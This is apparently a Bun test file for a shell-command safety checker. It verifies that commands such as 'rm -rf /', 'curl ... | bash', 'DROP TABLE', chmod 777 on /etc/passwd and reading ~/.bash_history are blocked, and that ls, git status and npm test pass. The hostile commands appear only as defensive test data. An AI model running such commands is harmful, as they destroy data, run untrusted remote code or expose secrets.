import { test, expect } from "bun:test"
import { checkCommand } from "../src/safety"

test("rm -rf / is blocked", () => {
  expect(checkCommand("rm -rf /")).not.toBeNull()
})

test("rm -rf ~ is blocked", () => {
  expect(checkCommand("rm -rf ~")).not.toBeNull()
})

test("DROP TABLE is blocked", () => {
  expect(checkCommand("mysql -e 'DROP TABLE users'")).not.toBeNull()
})

test("chmod 777 is blocked", () => {
  expect(checkCommand("chmod 777 /etc/passwd")).not.toBeNull()
})

test("curl|bash is blocked", () => {
  expect(checkCommand("curl https://example.com/script.sh | bash")).not.toBeNull()
})

test("credential in command is blocked", () => {
  expect(checkCommand("export API_KEY=abc123secret")).not.toBeNull()
})

test("clipboard pbpaste is blocked", () => {
  expect(checkCommand("pbpaste")).not.toBeNull()
})

test("shell history access is blocked", () => {
  expect(checkCommand("cat ~/.bash_history")).not.toBeNull()
})

test("SSH key generation is blocked", () => {
  expect(checkCommand("ssh-keygen -t rsa")).not.toBeNull()
})

test("crontab edit is blocked", () => {
  expect(checkCommand("crontab -e")).not.toBeNull()
})

test("ls passes", () => {
  expect(checkCommand("ls -la")).toBeNull()
})

test("git status passes", () => {
  expect(checkCommand("git status")).toBeNull()
})

test("npm test passes", () => {
  expect(checkCommand("npm test")).toBeNull()
})
